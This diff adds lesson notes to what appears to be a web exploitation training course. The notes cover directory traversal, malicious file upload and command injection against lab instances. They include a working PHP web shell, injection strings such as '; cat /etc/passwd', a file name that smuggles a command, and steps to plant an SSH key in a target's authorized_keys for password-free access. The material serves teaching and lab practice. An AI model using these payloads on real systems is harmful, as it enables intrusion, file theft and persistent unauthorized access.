@@ -1,5 +1,176 @@
+
 ## Web Exploitation ##
 
+Command Examples:
+
+Use POST method to login to website `curl -X POST http://website -d 'username=yourusername&password=yourpassword'` 
+
+Send Cookie settings with data, then pipe results `curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png`
+
+Save to file `curl -o stuff.html http://website/stuff.html`
+
+recursive download two level deep of base dir and save to /tmp `wget -r -l2 -P /tmp ftp://ftpserver/`
+
+Save cookies for website into a file `wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website`
+
+Use the cookie file to grab the page we want `wget --load-cookies cookies.txt -p http://example.com/interesting/article.php`
+
+Server-Side Injection (URL, Upload)
+OUTCOME: This section of facilitation introduces the students to the concepts required for skills skill11 and skill12. Students will be able to identify and leverage unsanitized input that is handled in server land as it pertains to URLs, command execution, and file uploads.
+
+
+
+### Techniques For Server-Side Injection ###
+
+- While XSS is an injection technique that targets the client browser of a visitor for execution, there are other techniques that target components of the server. In all instances of these latter techniques, the server receives input from the user and executes it in the server-side before returning HTML to the user. If that input is not properly sanitized, it can be used to trigger unintended consequences. Some common examples of server-side injections include directory traversal, command injection, malicious file upload, and SQL injections (SQLI). In this section, we will cover the first three.
+
+#### Directory Traversal: ####
+
+- Directory traversal vulnerabilities exist when an attacker is able to read files on a web server that are outside of the intended scope by the developers. More generally, directory traversal gives an attacker arbitrary read of any file that the web server process has read permission for. This type of vulnerability often occurs in the part of the server that fetches a resource and returns it to the user. This type of vulnerability can manifest in server software such as Apache, IIS, or Nginx, but also in the web applications written in server-side languages as well.
+
+- Imagine a website that allows users to upload and then fetch pictures. Let’s say the pictures are stored in a separate directory isolated from the primary server (such as a file server) and one of the web pages provides a method to return files by name.
+
+    - Say view_image.php receives filenames via a "file" GET parameter such as `view_image.php?file=logo.png`. This page then takes that parameter, and without doing any checks on the value, concatenates it with the path "/data/uploads/" and then returns it to the user. That is, the final path is "/data/uploads/" + "logo.png".
+
+    - A malicious actor could use the lack of sanitization in the file read to access any file on the server that is readable by the server process. For example, on a unix-like system, `view_image.php?file=../../etc/passwd` would return the passwd file back, because `/data/uploads/../../etc/passwd` becomes just `/etc/passwd`. Arbitrary file reads like this can also be used to leak the server-side source code and hunt for further vulnerabilities in other parts of the source code.
+
+          Do not confuse Directory Traversal with Command Injection. Directory traversal involves a script that is READING a file while Command Injection involves EXECUTING a command. However, you COULD execute cat to read a file. A command injection test would detect the latter.
+
+
+#### DEMO: Directory Traversal ####
+
+1. Demo-Web_Exploit_upload instance navigate to `http://<float IP>/path/pathdemo.php`
+
+2. Page is set to read files from /etc so you can lookup: passwd, profile, networks, etc
+
+3. Traverse to these two files `../../../../var/www/html/robots.txt` and `../../../../usr/share/joe/lang/fr.po
+`
+
+#### Malicious File Upload: ####
+
+- Malicious file upload vulnerabilities exist when a user is allowed to upload files to a server in a way that allows an attacker to upload malicious content to the server. An example might be a vulnerability that allows unauthenticated users to host arbitrary malicious files that could leverage the website’s reputation for use in phishing campaigns. However, often it also could allow for direct compromise of the webserver itself, such as in the upload of server-side script files that can later be executed with GET requests.
+
+- Let’s return to the image hosting server in the directory traversal example. Let’s imagine the server is running Apache2 with the PHP module and is configured to serve all files at and within the default server directory of /var/www/html. Additionally, the server is configured with the default settings to execute any file with at .php extension with the PHP interpreter.
+
+    - Instead of storing the files in /data/uploads, upload.php stores the files in `/var/www/html/uploads`. The programmer intended for upload.php to only upload image files, but did not properly validate that the files were images. Consequently, it is possible to upload a malicious PHP named `image.png.php`.
+
+    - Because of how Apache and PHP work together in this situation, the attacker can execute this malicious file by accessing `http://server/uploads/image.png.php`. Attackers can leverage this technique to upload a web shell that allows them to execute arbitrary commands on the server:
+
+        ``` 
+        <HTML><BODY>
+        <FORM METHOD="GET" NAME="myform" ACTION="">
+        <INPUT TYPE="text" NAME="cmd">
+        <INPUT TYPE="submit" VALUE="Send">
+        </FORM>
+        <pre>
+        <?php
+        if($_GET['cmd']) {
+            system($_GET['cmd']);
+            }
+        ?>
+        </pre>
+        </BODY></HTML>
+
+        ```
+
+
+The ability to trick the server to executing arbitrary files based on their extension is especially common in servers like Apache, Nginx or IIS. However, it also is possible in other frameworks as well. If there isn’t sanitization on the file name, an attacker can upload files to arbitrary locations as well.
+
+Imagine we were using the Python framework Flask, which often tracks accessible URIs as routes in a file called views.py. We might be able to overwrite the normal views.py with our own malicious version that adds a URI route for command injection.
+
+DEMO: Malicious File Upload
+
+1. Browse to the Demo-Web_Exploit_XSS instance by navigating to `http://<float IP>`
+
+2. Create malicious file with code above and upload.
+
+3. Navigate to `/uploads` and click your file or call it directly `/uploads/<evil_file>`
+
+4. Conduct enumeration to determine how we could develop a secure shell
+
+5. After enumeration, perform commands such as uploading your ssh key
+
+#### Command Injection ####
+
+Command injection occurs when some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands.
+
+A very basic command injection that is common in home router diagnostic tools is the ping utility. In this case, a web interface allows users to ping an IP address to see if it is online. A vulnerable server might do something as simple as execute `system("ping -c 1 ".$_GET["ip"]);` on the server-side of the website.; An attacker could leverage this to inject `; cat /etc/passwd,` which would make the overall command that is executed `ping -c 1 ; cat /etc/passwd`.
+
+While the basic ping command injection example seems obvious, command injection can occur in places that may not seem inherently obvious. Let’s go back to the image hosting example we’ve been using. Let’s say the developer wants to check to see if the file being uploaded is actually an image file. First it checks if the final extension is either .png, .jpg, or .gif. Then it copies the file to /tmp/imgcheck/filename and runs `file /tmp/imgcheck/filename` to make sure the file utility recognizes the file headers as one of the accepted image types. A malicious user could set the filename of the upload to be `; cat /etc/passwd;#.png`. When the script tries to open the path for writing, it will fail because "/tmp/imgcheck/; cat /etc/passwd;#.png" is not a valid path. However, when it tries to run the file command, it will execute `file /tmp/imgcheck/; cat /etc/passwd;#.png`.
+
+    Trying to read /etc/passwd is a common check for command execution or directory traversal because the file is globally readable. However, another technique is to run a ping to an IP address that the attacker controls and then watch a packet capture on that remote device and watch for a successful ping.
+
+
+#### Demo: Command Injection ####
+
+1. Demo-Web_Exploit_upload instance navigate to http://<float IP>/cmdinjection/cmdinjectdemo.php
+
+2. Ping a IP to show the page works as designed
+
+3. Showcase a few ways to successfully invoke command injection and perform system enumeration
+
+    ```
+    ; whoami
+    ; cat /etc/passwd
+    ; ls -latr & netstat -rn
+    || ifconfig
+
+     ```
+
+4. After enumeration, perform commands such as uploading your ssh key to gain access
+
+#### SSH Key Upload ####
+
+Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.
+
+##### SSH Key Setup #####
+
+1. Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
+
+`ssh-keygen -t rsa`
+
+2. After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
+
+`cat ~/.ssh/id_rsa.pub`
+
+    The entire output is your public key, make sure when uploading you copy everything
+
+##### Uploading SSH Key #####
+
+On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
+
+    The following process is done on target through command injection or malicious upload.
+
+1. Find out what account is running the web sever/commands.
+
+`whoami`
+
+2. Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.
+
+`www-data:x:33:33:www-data:/var/www:/bin/bash`    #/var/www is the home folder for this user and /bin/bash is login shell.
+
+3. Check to see if `.ssh` folder is in the users home directory. If not make it
+
+`ls -la /users/home/directory` #check if .ssh exists
+
+`mkdir /users/home/directory/.ssh` #make .ssh in users home folder if it does not exist
+
+4. Echo ssh key to the authorized_keys file in the users .ssh folder.
+
+`echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys`
+
+5. Verify key has been uploaded successfully.
+
+`cat /users/home/directory/.ssh/authorized_keys`
+
+Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.
+
+SQL able examples -> https://www.programiz.com/sql/select
+
+
+
+
+### Challenges ###
 Donovian Web Exploitation (DWE)
 XX OCT 2023
 Start Time: 1300
